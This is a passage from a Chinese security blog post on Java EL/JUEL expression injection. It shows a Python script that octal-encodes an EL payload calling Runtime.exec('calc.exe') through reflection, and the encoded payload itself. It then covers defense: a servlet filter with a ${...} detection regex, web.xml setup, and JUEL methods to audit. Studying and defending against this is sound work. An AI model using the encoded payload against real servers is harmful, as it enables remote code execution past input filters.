<pre class="line-numbers language-java" data-language="java"><code class="language-java">str <span class="token operator">=</span> <span class="token string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> s in str<span class="token operator">:</span>
  num <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> <span class="token function">oct</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
  result <span class="token operator">+=</span> num
<span class="token function">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payloadï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">\<span class="token number">44</span>\<span class="token number">173</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">146</span>\<span class="token number">157</span>\<span class="token number">162</span>\<span class="token number">116</span>\<span class="token number">141</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">152</span>\<span class="token number">141</span>\<span class="token number">166</span>\<span class="token number">141</span>\<span class="token number">56</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">156</span>\<span class="token number">147</span>\<span class="token number">56</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">115</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">150</span>\<span class="token number">157</span>\<span class="token number">144</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">145</span>\<span class="token number">170</span>\<span class="token number">145</span>\<span class="token number">143</span>\<span class="token number">47</span>\<span class="token number">54</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">151</span>\<span class="token number">156</span>\<span class="token number">166</span>\<span class="token number">157</span>\<span class="token number">153</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">146</span>\<span class="token number">157</span>\<span class="token number">162</span>\<span class="token number">116</span>\<span class="token number">141</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">152</span>\<span class="token number">141</span>\<span class="token number">166</span>\<span class="token number">141</span>\<span class="token number">56</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">156</span>\<span class="token number">147</span>\<span class="token number">56</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">115</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">150</span>\<span class="token number">157</span>\<span class="token number">144</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">151</span>\<span class="token number">156</span>\<span class="token number">166</span>\<span class="token number">157</span>\<span class="token number">153</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">156</span>\<span class="token number">165</span>\<span class="token number">154</span>\<span class="token number">154</span>\<span class="token number">51</span>\<span class="token number">54</span>\<span class="token number">47</span>\<span class="token number">143</span>\<span class="token number">141</span>\<span class="token number">154</span>\<span class="token number">143</span>\<span class="token number">56</span>\<span class="token number">145</span>\<span class="token number">170</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">175</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>è¿‡æ»¤å…³é”®å­—ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// Regex pattern to detect potential EL injections</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">EL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"\\$\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Initialization code if necessary</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>
            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>

            <span class="token comment">// Check query parameters</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential EL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token comment">// Check headers</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> header <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential EL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// Continue with the filter chain</span>
        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Cleanup code if necessary</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// Method to check if a value contains potential EL injection patterns</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant">EL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>web.xmlé…ç½®</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>EL_INJECTION_PATTERN</strong>ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼<code>\\$\\&#123;[^&#125;]+\\&#125;</code>æ¥æ£€æµ‹ELè¡¨è¾¾å¼æ³¨å…¥çš„æ¨¡å¼ã€‚</p>
<p><strong>doFilteræ–¹æ³•</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥è¯·æ±‚å‚æ•°å’Œè¯·æ±‚å¤´ä¸­çš„å€¼æ˜¯å¦åŒ…å«æ½œåœ¨çš„ELæ³¨å…¥æ¨¡å¼ã€‚</li>
<li>å¦‚æœæ£€æµ‹åˆ°æ½œåœ¨çš„ELæ³¨å…¥ï¼ŒæŠ›å‡º<code>ServletException</code>ï¼Œé˜»æ­¢è¯·æ±‚ç»§ç»­å¤„ç†ã€‚</li>
</ul>
<p><strong>initå’Œdestroyæ–¹æ³•</strong>ï¼šè¿™äº›æ–¹æ³•ç”¨äºåœ¨è¿‡æ»¤å™¨çš„åˆå§‹åŒ–å’Œé”€æ¯æ—¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»£ç ã€‚</p>
<p>å¦‚æœæ˜¯æ’æŸ¥Javaç¨‹åºä¸­JUELç›¸å…³ä»£ç ï¼Œåˆ™æœç´¢å¦‚ä¸‹å…³é”®ç±»æ–¹æ³•ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span>ExpressionFactory</span><span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span>ValueExpression</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: 'å†™ç‚¹ä»€ä¹ˆå§(â—Ë‡âˆ€Ë‡â—)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 é›²æµã®Lowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>